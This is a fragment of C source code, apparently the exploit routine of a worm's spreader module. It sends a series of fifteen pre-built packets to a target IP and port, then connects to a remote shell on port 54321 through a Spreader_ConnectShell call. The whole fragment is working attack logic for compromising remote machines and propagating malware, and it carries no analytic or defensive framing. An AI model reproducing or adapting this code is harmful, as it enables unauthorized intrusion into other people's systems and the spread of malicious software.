...
//	pexploit->gotinfo = true;
	...
	target.sin_addr.s_addr = exparam.ip;
	target.sin_port = htons(exparam.port);
	...
	sendto(sock,peer0_0,sizeof(peer0_0),0,(struct sockaddr *)&target,sizeof(target));
	recv(sock, repbf, sizeof(repbf), 0);
	sendto(sock,peer0_1,sizeof(peer0_1),0,(struct sockaddr *)&target,sizeof(target));
	recv(sock, repbf, sizeof(repbf), 0);
	sendto(sock,peer0_2,sizeof(peer0_2),0,(struct sockaddr *)&target,sizeof(target));
	recv(sock, repbf, sizeof(repbf), 0);
	sendto(sock,peer0_3,sizeof(peer0_3),0,(struct sockaddr *)&target,sizeof(target));
	recv(sock, repbf, sizeof(repbf), 0);
	sendto(sock,peer0_4,sizeof(peer0_4),0,(struct sockaddr *)&target,sizeof(target));
	recv(sock, repbf, sizeof(repbf), 0);
	sendto(sock,peer0_5,sizeof(peer0_5),0,(struct sockaddr *)&target,sizeof(target));
	recv(sock, repbf, sizeof(repbf), 0);
	sendto(sock,peer0_6,sizeof(peer0_6),0,(struct sockaddr *)&target,sizeof(target));
	recv(sock, repbf, sizeof(repbf), 0);
	sendto(sock,peer0_7,sizeof(peer0_7),0,(struct sockaddr *)&target,sizeof(target));
	recv(sock, repbf, sizeof(repbf), 0);
	sendto(sock,peer0_8,sizeof(peer0_8),0,(struct sockaddr *)&target,sizeof(target));
	recv(sock, repbf, sizeof(repbf), 0);
	sendto(sock,peer0_9,sizeof(peer0_9),0,(struct sockaddr *)&target,sizeof(target));
	recv(sock, repbf, sizeof(repbf), 0);
	sendto(sock,peer0_10,sizeof(peer0_10),0,(struct sockaddr *)&target,sizeof(target));
	recv(sock, repbf, sizeof(repbf), 0);
	sendto(sock,peer0_11,sizeof(peer0_11),0,(struct sockaddr *)&target,sizeof(target));
	recv(sock, repbf, sizeof(repbf), 0);
	sendto(sock,peer0_12,sizeof(peer0_12),0,(struct sockaddr *)&target,sizeof(target));
	recv(sock, repbf, sizeof(repbf), 0);
	sendto(sock,peer0_13,sizeof(peer0_13),0,(struct sockaddr *)&target,sizeof(target));
	recv(sock, repbf, sizeof(repbf), 0);
	sendto(sock,peer0_14,sizeof(peer0_14),0,(struct sockaddr *)&target,sizeof(target));
//	shell_connect(exploit.ip, 54321);
	Spreader_ConnectShell(exparam, 54321);
	closesocket(sock);
	//_endthreadex(0);
	return;
}
